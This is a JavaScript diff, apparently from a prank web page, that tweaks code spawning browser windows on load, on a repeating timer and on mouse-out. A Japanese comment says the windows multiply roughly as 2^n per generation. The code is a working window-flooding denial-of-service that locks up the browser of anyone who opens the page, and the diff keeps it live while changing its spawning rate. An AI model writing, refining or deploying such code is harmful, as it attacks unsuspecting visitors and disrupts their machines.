@@ -70,6 +70,7 @@
 // ---------- JavaScript ----------
 var xOff = 5, yOff = 5, xPos = 400, yPos = -100, flagRun = 1;
 let clickCount = 0;
+const splitIntervalMs = 1200;
 
 // クリックエフェクト追加
 document.addEventListener('click', function(e) {
@@ -116,7 +117,8 @@ function openWindow() {
 }
 
 function proCreate() {	
-    for (var i = 0; i < 5; i++) openWindow();
+    // 各ウィンドウが1つずつ子を作るので、世代ごとに概ね2^n増殖
+    openWindow();
 }
 
 function newXlt() { xOff = Math.ceil(-6 * Math.random()) * 5 - 10; window.focus(); }
@@ -141,7 +143,7 @@ window.onload = function () {
     flagRun = 1;
     playBall();
     proCreate();
-    setInterval(proCreate, 400);
+    setInterval(proCreate, splitIntervalMs);
 };
 
 window.onmouseout = proCreate;
